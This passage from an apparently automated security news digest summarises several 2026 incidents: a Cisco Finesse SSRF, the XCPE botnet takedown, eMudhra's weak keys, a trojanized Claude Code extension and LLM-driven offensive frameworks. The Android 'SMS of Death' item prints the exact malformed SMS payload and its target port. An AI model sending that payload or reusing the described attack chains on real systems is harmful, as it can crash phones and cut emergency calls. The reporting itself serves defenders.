  - Link: https://securelist.com/cloud-infrastructure-isolation-bypass/121609/
  - Summary: A Kaspersky expert presents a cloud isolation bypass case honored at Russian Pentest Award 2026. Learn how vulnerabilities in Kubernetes, Konnectivity, and the overlay network lead to RCE and compromise of other tenants' services.

### Cluster 394e6e0663 — score 19

- Title: CVE-2026-20362 | Cisco Finesse Server-Side Request Forgery Vulnerability
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-28T13:13:26+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-20362/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-20362

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-20362
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- cve_ids: CVE-2026-20362
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
CVE-2026-20362 is a high-severity SSRF vulnerability in Cisco Finesse discovered by Horizon3 researchers, with affected versions, mitigations, and a NodeZero Rapid Response test.
```

#### Full body

```
CVE-2026-20362 Cisco Finesse Server-Side Request Forgery Vulnerability CVE-2026-20362 is a high-severity server-side request forgery (SSRF) vulnerability in Cisco Finesse’s web-based management interface. An unauthenticated remote attacker can send crafted HTTP requests through an affected server to obtain limited sensitive information from associated services. The vulnerability has a CVSS v3.1 score of 7.2 (High) . Discovered by Horizon3 researchers Noah King and Brandon Peterson, the vulnerability affects Finesse regardless of configuration. Cisco PSIRT reports no known malicious use. As of October 27, 2026, fixes remain scheduled for January and February 2027. Technical Details The flaw stems from improper input validation in the Finesse web interface. An attacker needs network access to the affected interface, but exploitation requires neither authentication nor user interaction. Horizon3’s technical findings identify the embedded Apache Shindig content proxy as the affected component. The proxy retrieves an attacker-supplied URL from the server and returns the response to the unauthenticated caller. An attacker can direct these requests to loopback-only or internal network services. For example, the Finesse REST API at 127.0.0.1:8082 exposes a SystemInfo response containing the deployment type, primary and secondary node hostnames, and XMPP domain. This enables infrastructure enumeration and access to responses from services that are not directly reachable externally. Vulnerability class: CWE-918, Server-Side Request Forgery. Authentication required: None. User interaction required: None. CVSS v3.1: 7.2 (High). Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N. Stop Guessing, Start Proving Schedule a demo NodeZero® Proactive Security Platform Rapid Response A NodeZero Rapid Response test has been developed to safely validate whether this vulnerability can be exploited in your environment. The test executes real attack techniques without causing damage, giving teams immediate clarity on exposure. Run the Rapid Response test: Launch from NodeZero to determine whether exploitation is possible. Reduce exposure now and patch when available: Restrict access to trusted networks or authenticated VPN connections while awaiting Cisco’s fixed releases. Apply the appropriate update when released. Re-run the test: Assess the effectiveness of access restrictions from the relevant network locations, then verify that the vulnerability is no longer exploitable after patching. Affected Versions & Patch Affected Product Affected release families Cisco Finesse 12.6 and earlier; 15.0 Cisco Packaged Contact Center Enterprise and Unified Contact Center Enterprise Earlier than 15.0; 15.0 Cisco Unified Contact Center Express 12.5 and earlier; 15.0 Cisco Unified Intelligence Center is not affected. Fixed No fixed release is available as of October 27, 2026. Cisco lists the following planned releases: Product Planned first fixed release Target availability Cisco Finesse 15.0(1) SU3 February 2027 Cisco Packaged CCE and Unified CCE 15.0(1)ES202701 January 2027 Cisco Unified CCX 15.0(1) SU2 February 2027 Older branches require migration to a fixed release. Upgrading to an affected 15.0 release does not resolve the vulnerability. Review Cisco’s advisory for updated availability. Mitigations Cisco lists no workaround that addresses the vulnerability. While awaiting patches, reduce exposure by restricting the Finesse web interface to trusted networks or authenticated VPN connections. Monitor for unexpected requests from Finesse servers to internal services. These measures reduce opportunities for exploitation; they do not correct the underlying flaw. Timeline October 7, 2026: Cisco published its advisory, credited Horizon3’s researchers, and announced planned fixed releases. October 7, 2026: NVD published the vulnerability record. October 27, 2026: Horizon3 released the NodeZero Rapid Response test for CVE-2026-20362. References Cisco Security Advisor
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-20362 | Cisco Finesse Server-Side Request Forgery Vulnerability
  - Published: 2026-10-28T13:13:26+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-20362/
  - Summary: CVE-2026-20362 is a high-severity SSRF vulnerability in Cisco Finesse discovered by Horizon3 researchers, with affected versions, mitigations, and a NodeZero Rapid Response test.

### Cluster 4655c5e779 — score 18

- Title: Shutting the Door on the XCPE Botnet
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-11-02T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/shutting-the-door-on-the-xcpe-botnet/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain, web_shell_backdoor
- affected_industries: financial_services, legal_professional, manufacturing_industrial
- affected_products: Android
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, web_shell_backdoor
- affected_industries: financial_services, manufacturing_industrial, legal_professional
- affected_products: Android
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Introduction Last week, Google and industry partners dismantled the XCPE backdoor which enrolled more than 1.3 million set-top boxes into a botnet. We assess with high confidence that the backdoor and botnet were intentionally developed, deployed, and operated for financial gain by Videostrong Technology Co., an Android Original Equipment Manufacturer (OEM) and Original Design Manufacturer (ODM). Videostrong monetized the backdoor by selling access to criminal affiliates and loading those affiliates’ malware modules onto infected devices. These secondary modules were conducting ad-fraud; silently enrolling infected devices into residential proxy networks; and loading additional malware onto XCPE-compromised devices. We also took action to disrupt the command and control (C2) domains that operate these affiliate modules. Because these affiliates each have diversified distribution channels for their modules beyond XCPE, we assess that taking down their C2 domains will sever access to at
```

#### Full body

```
Threat Intelligence Shutting the Door on the XCPE Botnet November 2, 2026 Google Threat Intelligence Group Google Threat Intelligence Visibility and context on the threats that matter most. Contact Us & Get a Demo Introduction Last week, Google and industry partners dismantled the XCPE backdoor which enrolled more than 1.3 million set-top boxes into a botnet. We assess with high confidence that the backdoor and botnet were intentionally developed, deployed, and operated for financial gain by Videostrong Technology Co., an Android Original Equipment Manufacturer (OEM) and Original Design Manufacturer (ODM). Videostrong monetized the backdoor by selling access to criminal affiliates and loading those affiliates’ malware modules onto infected devices. These secondary modules were conducting ad-fraud; silently enrolling infected devices into residential proxy networks; and loading additional malware onto XCPE-compromised devices. We also took action to disrupt the command and control (C2) domains that operate these affiliate modules. Because these affiliates each have diversified distribution channels for their modules beyond XCPE, we assess that taking down their C2 domains will sever access to at least 10 million additional compromised devices. We found this malicious software built directly into many different device models and brands over multiple years, supported by dedicated infrastructure and constantly evolving configurations to evade detection and manage their affiliates. We believe this campaign wasn’t an isolated rogue insider or a development oversight. As a result, Google has cut ties with Videostrong and banned them from making devices with preloaded Google apps. Google requires OEMs go through a comprehensive suite of compatibility and security tests to ensure a consistent and safe user experience across the Android ecosystem. However, Videostrong employed obfuscation techniques to exploit a gap in our tests and load malicious code after the device's first boot. As a result, Google has implemented changes to its existing review process to better safeguard against similar activity in the future. A device manufacturer intentionally infecting their users with malware is an unacceptable breach of trust, and represents a serious risk to those users. Without users’ knowledge or consent, infected devices were offered as a distribution mechanism for a wide array of criminal actors. This led to a variety of malicious activities being conducted on and through the devices, including ad-fraud, data exfiltration, and routing malicious network traffic through the devices. We worked closely with Japan’s National Police Agency, Lumen, HUMAN Security, Plume, Synthient, and TrendAI to analyze this malware ecosystem and disrupt its operations. While we expect this disruption to have a significant effect on these criminal operations, this is not the end of our work combatting malicious activity. Backdoor operators, ad-fraud rings, and residential proxy providers operate as an interconnected supply chain. Point-in-time disruptions are a critical tool to protect our users, but lasting disruption in this fluid ecosystem will require continued targeting of this infrastructure. Google undertook the following actions to support disruption of the XCPE botnet: Legal action to take down the domains and servers Videostrong used to control the botnet and install malware modules Legal action to take down C2 domains used by over a dozen malware families loaded as modules via this backdoor Banned Videostrong and any future subsidiaries or affiliates from building and selling certified Android devices in the future, or supplying software to other certified vendors Implementing improvements to how we ensure the integrity of firmware on certified Android TV devices Overview The x.cpe network was built for ongoing profit. By giving malware affiliates backdoor access, the operators conspired to monetize these devices long after purchase. Figure 1: XCPE m
```

#### Corroborating sources (2)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: Shutting the Door on the XCPE Botnet
  - Published: 2026-11-02T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/shutting-the-door-on-the-xcpe-botnet/
  - Summary: Introduction Last week, Google and industry partners dismantled the XCPE backdoor which enrolled more than 1.3 million set-top boxes into a botnet. We assess with high confidence that the backdoor and botnet were intentionally developed, deployed, and operated for financial gain by Videostrong Technology Co., an Android Original Equipment Manufacturer (OEM) and Original Design Manufacturer (ODM). Videostrong monetized the backdoor by selling access to criminal affiliates and loading those affiliates’ malware modules onto infected devices. These secondary modules were conducting ad-fraud; silently enrolling infected devices into residential proxy networks; and loading additional malware onto XCPE-compromised devices. We also took action to disrupt the command and control (C2) domains that operate these affiliate modules. Because these affiliates each have diversified distribution channels for their modules beyond XCPE, we assess that taking down their C2 domains will sever access to at
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Shutting the Door on the XCPE Botnet
  - Published: 2026-11-02T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/shutting-the-door-on-the-xcpe-botnet/
  - Summary: Introduction Last week, Google and industry partners dismantled the XCPE backdoor which enrolled more than 1.3 million set-top boxes into a botnet. We assess with high confidence that the backdoor and botnet were intentionally developed, deployed, and operated for financial gain by Videostrong Technology Co., an Android Original Equipment Manufacturer (OEM) and Original Design Manufacturer (ODM). Videostrong monetized the backdoor by selling access to criminal affiliates and loading those affiliates’ malware modules onto infected devices. These secondary modules were conducting ad-fraud; silently enrolling infected devices into residential proxy networks; and loading additional malware onto XCPE-compromised devices. We also took action to disrupt the command and control (C2) domains that operate these affiliate modules. Because these affiliates each have diversified distribution channels for their modules beyond XCPE, we assess that taking down their C2 domains will sever access to at

### Cluster fd0e5d6d3b — score 17

- Title: 4 real? Tracking exploitation and patching of eMudhra’s weak keys
- Source: Cloudflare Security (cloud_identity_infrastructure)
- Published: 2026-10-30T17:38:50+00:00
- Link: https://blog.cloudflare.com/emudhra-patching/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Four, just four: that’s the key to break into any unpatched connection on the Internet that is using eMudhra certificates. Here’s how we quickly patched Cloudflare, what evidence we can see of attempted exploitation, and how much of the rest of the Internet remains exposed.
```

#### Full body

```
On October 19, 2026, we learned about eMudhraâs eight shockingly weak keys: where eMudhra was trusted to pick a 115-digit number for their virtual combination lock protecting the Internet, they picked the number 4. Not even four digits, just the number 4. The other seven keys were similarly weak: 56, 66, 115, 155, 156, 230 and 237. The next day, we wrote a blog post Â on the immediate action we took to mitigate this leak, and what customers needed to do Â on their end to stay secure. Now, we are sharing a more in-depth follow up on the evidence weâve seen of exploitation, and the progress seen on visitors patching their systems. Let's start with the scale of the problem. A certificate authority (CA) with weak keys this serious is unprecedented, and the potential consequences are significant. While there have been plenty of compromised certification authorities in the past (such as DigiNotar , TÃRKTRUST , and TrustWave ), access to their keys has always been contained to a degree; these incidents gave a limited set of attackers or organizations the ability to issue fraudulent certificates. The eMudhra incident is fundamentally different; the affected intermediate private keys could be recovered almost instantly by anyone Â from the public certificates themselves. Anyone can independently recover these same signing keys and create certificates for any domain that an unpatched client not enforcing Certificate Transparency would accept. eMudhra announced Â theyâre exiting the public CA business and have claimed a mistake Â in a key generation script, but have not yet shared the script. They signed Â a certificate revocation list (CRL) with what mightâve been a correctly generated key, and subsequently corrected it to be signed with the weak key. How did that come to be and why didnât that set off alarms? Much has to be cleared up, including the role of the auditors and cross signers.Â This blog proposes the fixes and next steps for organizations to ensure they are secure. Patching Cloudflare Our primary concern remains the security impact on Cloudflare, our customers, and the Internet as a whole. At the time of writing, all high priority Cloudflare systems have been patched. A small number of confirmed low impact tickets is being worked on. We started patchingÂ high-impact systems immediately on October 19.Â These included customer origin-facing proxies using Pingora , responsible for most of our outbound connections. These were patched in hours to reject the vulnerable eMudhra keys. At the same time, we started an AI-assisted analysis of our source code to find all other systems that trust these weak keys. Within four hours we had a full analysis. We assigned a ticket with preliminary analysis for each system, and asked the team to confirm and/or adjust the analysis before the end of the day. Where high impact was identified, we asked to patch immediately, and for the lower impact, remediation was due at the end of last week. Has CloudflareÂ seen exploitationÂ across its network? To track whenever a customerâs server (or attacker) presents a certificate signed by eMudhraâs weak keys, we added logging to Pingora. As this outbound service accounts for the vast majority of outgoing TLS connections from a Cloudflare machine, any attacker attempting to snoop using the eMudhra keys would trigger this logging. The logging finished rolling out October 21. At the time of writing, a week later, weâve seen about 22,000 attempted handshakesÂ with the weak eMudhra keys. Two-thirds of the attempts were fetches of test sites such as emudhra.we-have-a-problem.com Â (which we mentioned Â in the developer guidance in our earlier post). Almost all of the remaining third went to origins who appeared to set up a certificate for themselves using the weak intermediate. Every handshake configured to verify the certificate was refused, as we already patched. About 160 of these handshakes stood out: the certificatesâ Subject Alternative
```

#### Corroborating sources (1)

- **Cloudflare Security** (cloud_identity_infrastructure)
  - Title: 4 real? Tracking exploitation and patching of eMudhra’s weak keys
  - Published: 2026-10-30T17:38:50+00:00
  - Link: https://blog.cloudflare.com/emudhra-patching/
  - Summary: Four, just four: that’s the key to break into any unpatched connection on the Internet that is using eMudhra certificates. Here’s how we quickly patched Cloudflare, what evidence we can see of attempted exploitation, and how much of the rest of the Internet remains exposed.

### Cluster 5e5aace957 — score 16

- Title: New Android SMS of Death exploit can remotely crash unpatched phones
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-10-31T15:35:11+00:00
- Link: https://www.bleepingcomputer.com/news/security/new-android-sms-of-death-exploit-can-remotely-crash-unpatched-phones/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-58882

#### Cluster taxonomy (union across members)
- threat_categories: ddos, phishing_social_eng, zero_day
- affected_industries: manufacturing_industrial, telecommunications
- affected_products: Android, Google Workspace, Microsoft 365
- cve_ids: CVE-2026-58882
- urgency_signals: no_patch_yet, poc_available, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, ddos
- affected_industries: manufacturing_industrial, telecommunications
- affected_products: Android, Microsoft 365, Google Workspace
- cve_ids: CVE-2026-58882
- urgency_signals: zero_day, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A security researcher has released a proof-of-concept exploit for a recently patched Android vulnerability, dubbed "SMS of Death" and tracked as CVE-2026-58882, that lets attackers remotely disrupt cellular service or crash phones by sending a specially crafted text message. [...]
```

#### Full body

```
New Android SMS of Death exploit can remotely crash unpatched phones By Lawrence Abrams October 31, 2026 11:35 AM 1 A security researcher has released a proof-of-concept exploit for a recently patched Android vulnerability, dubbed "SMS of Death" and tracked as CVE-2026-58882, that lets attackers remotely disrupt cellular service or crash phones by sending a specially crafted text message. The zero-click denial-of-service flaw can interrupt ongoing calls, including emergency calls, without requiring any interaction from the target. What's worse, Android processes the message before it reaches the SMS inbox, leaving victims with no visible indication of what caused their phones to crash. According to the vulnerability researcher, Mark Blah, Google reportedly patched the vulnerability in its October 2026 Android security updates for Android 14 through 17. However, the flaw is not listed in Google's October security bulletin, and older Android 12 and 13 devices remain vulnerable because they did not receive the fix. Blah published a technical analysis of the flaw, caused by improper validation of a header-length value in Android's WapPushOverSms.decodeWapPdu function. To exploit the flaw, an attacker can send the following malformed eight-byte WAP Push message to targeted phones: 01 06 88 80 80 80 00 BE → sent as a data SMS to port 2948 When this value is translated into a signed 32-bit integer without a bounds check, it becomes -2147483648. When Android attempts to allocate memory using this negative value, it triggers a NegativeArraySizeException that crashes the com.android.phone process. As the com.android.phone process manages cellular functions, the crash disrupts mobile connectivity and disconnects ongoing phone calls, including calls to emergency services. The researcher says the attack can also cause repeated crashes when carriers attempt to redeliver malicious messages or Android tries to process messages already stored on the phone. When testing the flaw, the researcher found that sending 20 malicious messages could cause phones to get stuck in reboot loops. On one Android 12 device, the phone rebooted into recovery mode approximately every 90 seconds, requiring the user to perform a factory reset to recover. A GitHub contributor named Sakis discovered a way to remove the malicious messages using Android Debug Bridge (ADB), but the process requires more advanced technical knowledge and access to a computer. The researcher has published a proof-of-concept exploit that can send the malicious messages from another Android device. Google's fix, titled "Fix remote DoS in decodeWapPdu," prevents the crashes by catching exceptions triggered when Android processes the malformed text messages. The patch also deletes malicious messages from the SMS database to prevent them from triggering repeated crashes. Android security updates are generally installed automatically on supported devices, but their availability depends on the device manufacturer and carrier, and a restart may be required to complete installation. Now that a working proof-of-concept exploit has been released, Android users are strongly advised to install the latest security updates to protect their devices. Uncover email threats your existing defenses may miss. Adaptive Security's AI agents analyze email intent, context, and behavior to uncover phishing, business email compromise, and invoice fraud. See what's getting through with a 14-day read-only scan of Microsoft 365 or Google Workspace, with no MX changes. Start your free email security scan. Related Articles: Your Mobile Carrier Stores Your Call Logs for Years From Beginner to Bug Hunter: Learning Cybersecurity in the AI Era. Lifetime access to 90+ cybersecurity courses is down to $52.99 SS7 and Diameter Attacks: How Signaling Flaws Expose Your Phone New Cisco firewall zero-day exploited to crash SSL VPN devices
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: New Android SMS of Death exploit can remotely crash unpatched phones
  - Published: 2026-10-31T15:35:11+00:00
  - Link: https://www.bleepingcomputer.com/news/security/new-android-sms-of-death-exploit-can-remotely-crash-unpatched-phones/
  - Summary: A security researcher has released a proof-of-concept exploit for a recently patched Android vulnerability, dubbed "SMS of Death" and tracked as CVE-2026-58882, that lets attackers remotely disrupt cellular service or crash phones by sending a specially crafted text message. [...]

### Cluster e2ef42690e — score 16

- Title: Inside a malicious Claude Code-branded extension and its persistent SSH backdoor
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-10-31T01:02:57+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/
- Fetch status: ok
- Member count: 13
- Corroborating source count: 8
- Strong signals: Anthropic/Claude

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, supply_chain, web_shell_backdoor
- affected_industries: financial_services
- affected_products: Anthropic/Claude, GitHub, Microsoft Defender, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, web_shell_backdoor
- affected_products: Anthropic/Claude, Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft analyzes a malicious Claude Code–branded extension, its persistent SSH backdoor, and guidance to detect and remediate it. The post Inside a malicious Claude Code-branded extension and its persistent SSH backdoor appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Frontier AI models Supply chain attack Threats intelligence AI threats Supply chain attacks Content types Research Products and services Microsoft Defender Topics Actionable threat insights AI and agents Threat intelligence On October 29, 2026, Cursor reported that a tampered copy of Claude Code extension (anthropic.claude-code, versions 2.1.313 and 2.1.312) was available and served in the Cursor extension marketplace for a few hours to attempt a supply-chain attack on Cursor users. Cursor reports that it was live from about 2:27 AM to 1:35 PM Pacific Daylight Time (PDT). We have confirmed that the malicious packages found on Cursor marketplace were never published nor distributed from Microsoft Visual Studio Marketplace and from npm @anthropic-ai/claude-code, which were not affected by this incident. Anthropic confirmed to Microsoft that their systems were not compromised and they did not develop the malicious package posted in Cursor marketplace. At this time, all evidence suggests that the incident is limited to Cursor marketplace. Microsoft Threat Intelligence analyzed the injected JavaScript embedded in the malicious extension package. The injected loader runs when the extension module loads and attempts to add an attacker-controlled Secure Shell (SSH) key, enable the local SSH service, establish reverse SSH forwarding, configure persistence, and report host details. Successful remote access depends on host privileges, SSH configuration, and the attacker’s server configuration; however, the loader may still write keys and persistence artifacts even when tunnel access fails. Organizations should identify systems that installed or automatically updated to this version from the Cursor marketplace, preserve evidence, remove confirmed malicious artifacts, review endpoint and network telemetry, and rotate credentials or revoke sessions when investigation indicates exposure. Microsoft customers can use the detections and hunting guidance in this post after the listed coverage and query validation gates are complete. Attack chain overview A malicious artifact associated with the Cursor Marketplace incident included a JavaScript function that executed before the extension’s expected code. When the module loads, this function can use Node.js APIs to collect host information, modify files, and execute operating-system commands. The following sections describe capabilities and attempted actions based on our analysis of the injected code. Attack chain The loader first collects host reconnaissance. It then attempts to install an SSH key, enable SSH, create a reverse tunnel, and configure persistence. A delayed callback subsequently attempts to send host details. The following sequence reflects code execution order; it does not prove that every step succeeded on every host. Module loading and reconnaissance collection. The injected function executes before normal extension initialization and collects host and user information. SSH access preparation. The loader appends an embedded public key and attempts to enable the local SSH service. Reverse forwarding. An embedded tunnel identity authenticates an outbound connection that requests forwarding to the workstation’s SSH port. Platform-specific persistence. Scripts and startup configuration are written to relaunch the connection. Host reconnaissance reporting. After the access and persistence setup attempts, a delayed callback attempts to transmit the previously collected host details and selected environment-variable names. Figure 1. Attack chain reconstructed from the injected code. The loader uses embedded components and built-in system tools to establish persistent access without downloading another executable. It suppresses command output and silently catches errors to conceal failures and malicious activity, while the extension continues functioning normally to avoid alerting users. Host reconnaissance collection The loader collects the hostname,
```

#### Corroborating sources (8)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Inside a malicious Claude Code-branded extension and its persistent SSH backdoor
  - Published: 2026-10-31T01:02:57+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/
  - Summary: Microsoft analyzes a malicious Claude Code–branded extension, its persistent SSH backdoor, and guidance to detect and remediate it. The post Inside a malicious Claude Code-branded extension and its persistent SSH backdoor appeared first on Microsoft Security Blog .
- **Check Point Research** (threat_research_primary)
  - Title: Tricks from the Past deployed via signed ChatGPT and Claude binaries
  - Published: 2026-10-27T13:03:27+00:00
  - Link: https://research.checkpoint.com/2026/tricks-from-the-past-deployed-via-signed-chatgpt-and-claude-binaries/
  - Summary: Key Points Introduction Over the past two months, we have been tracking a campaign that abuses the popularity of AI tools such as ChatGPT and Claude to spread a custom malware chain we call Yoba. The attackers use fake GitHub projects that pretend to be AI desktop applications like GPT-5.6 Sol, GPT-6 Astra, and Claude […] The post Tricks from the Past deployed via signed ChatGPT and Claude binaries appeared first on Check Point Research .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Inside a malicious Claude Code-branded extension and its persistent SSH backdoor
  - Published: 2026-10-31T01:02:57+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/
  - Summary: Microsoft analyzes a malicious Claude Code–branded extension, its persistent SSH backdoor, and guidance to detect and remediate it. The post Inside a malicious Claude Code-branded extension and its persistent SSH backdoor appeared first on Microsoft Security Blog .
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Malicious Claude Code Extension Served in Cursor Supply Chain Attack
  - Published: 2026-11-02T11:29:39+00:00
  - Link: https://www.securityweek.com/malicious-claude-code-extension-served-in-cursor-supply-chain-attack/
  - Summary: The extension performed host reconnaissance and attempted to create a reverse SSH tunnel. The post Malicious Claude Code Extension Served in Cursor Supply Chain Attack appeared first on SecurityWeek .
- **Sophos X-Ops** (detection_response_operations)
  - Title: Malicious Claude Code extension distributed through Cursor marketplace
  - Published: 2026-10-30T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/malicious-claude-code-extension-distributed-through-cursor-marketplace
  - Summary: Categories: Threat Research Tags: advisory, Cursor
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Devs Hit by Trojanized Claude Code Extension for Cursor
  - Published: 2026-10-30T20:05:58+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/devs-trojanized-claude-code-extension-cursor
  - Summary: Two serious security issues hit Cursor on the same day, highlighting the risks for AI-powered integrated development environments (IDEs).
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Official Claude Code Extension on Cursor Marketplace Trojanized with Persistent SSH Backdoor
  - Published: 2026-10-30T08:55:47+00:00
  - Link: https://thehackernews.com/2026/10/official-claude-code-vs-code-extension.html
  - Summary: Cybersecurity researchers have disclosed that a trojanized version of Anthropic's official Claude Code extension was distributed through the Cursor Marketplace as a legitimate update, attempting to install a persistent SSH backdoor on affected systems. The malicious update, version 2.1.313, was distributed under the extension's legitimate publisher identity, prompting Cursor to temporarily shut
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries
  - Published: 2026-10-28T15:13:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/attackers-hide-malware-behind/
  - Summary: Attackers have used fake ChatGPT and Claude projects to distribute Yoba malware

### Cluster a3b05cdd15 — score 16

- Title: ARTEX and Friends: Enter Agentic Offensive Frameworks
- Source: Google Cloud Threat Intelligence (threat_research_primary)
- Published: 2026-10-30T14:00:00+00:00
- Link: https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage
- urgency_signals: actively_exploited, no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- threat_categories: apt_espionage, active_exploitation
- urgency_signals: actively_exploited, no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Written by: Aurora Blum, David Mainor, Rohit Nambiar, Omar ElAhdan, Matthew McWhirt, Will Silverstone, Bhavesh Dhake, Chris Busse Introduction Recent intrusions in which threat actors have been observed weaponizing agentic frameworks to execute highly-automated intrusions has put a spotlight on evolving adversarial use of LLMs. In our September 2026 report , Google Threat Intelligence Group (GTIG) noted that forward leaning adversaries were beginning to transition from basic prompting to agentic workflows and LLM-enabled automation. Since this publication, GTIG and Mandiant have observed multiple threat actors abusing the open-source, agentic pentesting frameworks ARTEX, Hexstrike and CAIRN in incident response engagements to conduct a broad range of actions across multiple phases of the attack life cycle. This activity has been seen across the threat landscape, as noted in a recent Wiz report . The emergence of Artex and similar agentic offensive intrusion frameworks underscores a bro
```

#### Full body

```
Threat Intelligence ARTEX and Friends: Enter Agentic Offensive Frameworks October 30, 2026 Google Threat Intelligence Group Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Written by: Aurora Blum, David Mainor, Rohit Nambiar, Omar ElAhdan, Matthew McWhirt, Will Silverstone, Bhavesh Dhake, Chris Busse Introduction Recent intrusions in which threat actors have been observed weaponizing agentic frameworks to execute highly-automated intrusions has put a spotlight on evolving adversarial use of LLMs. In our September 2026 report , Google Threat Intelligence Group (GTIG) noted that forward leaning adversaries were beginning to transition from basic prompting to agentic workflows and LLM-enabled automation. Since this publication, GTIG and Mandiant have observed multiple threat actors abusing the open-source, agentic pentesting frameworks ARTEX, Hexstrike and CAIRN in incident response engagements to conduct a broad range of actions across multiple phases of the attack life cycle. This activity has been seen across the threat landscape, as noted in a recent Wiz report . The emergence of Artex and similar agentic offensive intrusion frameworks underscores a broader shift toward threat actor adoption of open source multi-agent offensive frameworks, as well as potentially custom agentic harnesses. This represents a paradigm shift towards intrusions occurring at machine speed, with the automated chaining of complex attack paths scaling intrusions exponentially. While the mechanics of the intrusions remain the same, such as using compromised credentials and targeting unpatched systems, the speed and scale at which frameworks can exploit these known weaknesses introduces a new defensive challenge. Security teams, developers, and system administrators will need to fundamentally rethink defense strategies to counter scalable, autonomous software. We also provide defensive strategies from Mandiant Consulting. The defensive strategies suggested—control-plane isolation, short-lived credentials, least privilege, segmentation, and behavioral detection—are long-standing security best practices. Observations in the Wild We are seeing tools used by adversaries evolving towards autonomous agentic attacks. One way this is occurring is through suites of tools or frameworks designed for penetration testing (“pentesting”). These tools and frameworks orchestrate various agents using open source and frontier LLMs to automate various stages of intrusions. Historically, cyber espionage and financially motivated threat actors have taken advantage of pentesting or red-teaming platforms built for security professionals to exploit systems, such as Cobalt Strike or Metasploit. Today, adversaries are pivoting toward offensive frameworks powered by LLMs. While these frameworks have existed in the wild, they are now yielding success in intrusions in the wild, representing a critical evolution that increases both the speed and scale of intrusion activity. Since late August 2026, we have observed threat actors actively operating popular open-source multi-agent pentesting platforms like ARTEX, PentAGI, CAIRN and other potentially custom harnesses within Mandiant incident response engagements; use of these platforms has been further corroborated by our research telemetry. In these incidents , we have observed agentic activity conducting significant parts of the attack lifecycle (e.g., lateral movement, database exploitation, exfiltration preparation). Evidence of in the wild usage of these frameworks marks a critical inflection point for defenders, as agents now autonomously explore multiple attack paths, troubleshoot errors, and achieve objectives in seconds and minutes. Coupled with continual advancements in underlying LLM capabilities, the acceleration in attack velocity and scale signals a notable shift in the threat landscape that fundamentally alters traditional intrusion dynamics. ARTEX Framework ARTEX is an auto
```

#### Corroborating sources (2)

- **Google Cloud Threat Intelligence** (threat_research_primary)
  - Title: ARTEX and Friends: Enter Agentic Offensive Frameworks
  - Published: 2026-10-30T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks/
